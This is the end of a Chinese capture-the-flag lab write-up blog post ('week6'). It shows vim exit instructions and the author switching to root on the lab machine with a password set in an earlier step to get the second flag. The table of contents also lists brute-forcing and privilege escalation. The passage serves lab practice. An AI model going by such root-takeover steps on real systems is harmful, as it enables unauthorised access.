<p>如果！！！那一步错了，先按<code>esc</code>退出模式，然后输入<code>:</code>进入命令模式输入<code>q!</code>强制退出。就不会保存了。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327144216305.png" alt="image-20230327144216305"></p>
<p>修改成功之后我们切换root用户。输入我们上面设置的密码即可。</p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327144239929.png" alt="image-20230327144239929"></p>
<p><img src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/image-20230327144303061.png" alt="image-20230327144303061"></p>
<p>拿到第二个flag</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://xiaoqiuxx.xyz">xiaoqiuxx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://xiaoqiuxx.xyz/2023/03/28/week6/">http://xiaoqiuxx.xyz/2023/03/28/week6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://xiaoqiuxx.xyz" target="_blank">xiaoqiuxx's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a></div><div class="post_share"><div class="social-share" data-image="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/28/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/"><img class="prev-cover" src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">bugku渗透测试1</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/28/week5/"><img class="next-cover" src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">week5</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/03/19/week2/" title="week2"><img class="cover" src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-19</div><div class="title">week2</div></div></a></div><div><a href="/2023/03/19/week1/" title="week1"><img class="cover" src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-19</div><div class="title">week1</div></div></a></div><div><a href="/2023/03/22/week3/" title="week3"><img class="cover" src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-22</div><div class="title">week3</div></div></a></div><div><a href="/2023/03/28/week4/" title="week4"><img class="cover" src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-28</div><div class="title">week4</div></div></a></div><div><a href="/2023/03/28/week5/" title="week5"><img class="cover" src="https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-28</div><div class="title">week5</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/xiaoqiuxx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">xiaoqiuxx</div><div class="author-info__description">努力是为了不只是听到别人的好消息</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xiaoqiuxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">随缘更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%91%A8"><span class="toc-number">1.</span> <span class="toc-text">第六周</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.</span> <span class="toc-text">工具安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E7%82%B9"><span class="toc-number">1.3.</span> <span class="toc-text">打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E5%85%AC%E9%92%A5%E8%AE%A4%E8%AF%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">ssh公钥认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.3.2.</span> <span class="toc-text">密码爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/29/frp/" title="无题">无题</a><time datetime="2023-10-29T03:16:57.825Z" title="发表于 2023-10-29 11:16:57">2023-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/27/BloodHound/" title="BloodHound">BloodHound</a><time datetime="2023-10-27T03:25:16.000Z" title="发表于 2023-10-27 11:25:16">2023-10-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Privilege/" title="春秋云镜-Privilege">春秋云镜-Privilege</a><time datetime="2023-10-27T03:20:44.000Z" title="发表于 2023-10-27 11:20:44">2023-10-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/" title="春秋云镜-Certify">春秋云镜-Certify</a><time datetime="2023-10-27T03:19:39.000Z" title="发表于 2023-10-27 11:19:39">2023-10-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/" title="春秋云镜-Time">春秋云镜-Time</a><time datetime="2023-10-27T02:23:05.000Z" title="发表于 2023-10-27 10:23:05">2023-10-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://xiaoqiuxx.oss-cn-hangzhou.aliyuncs.com/img/top.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By xiaoqiuxx</div><div class="footer_custom_text">每天都是新的开始</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>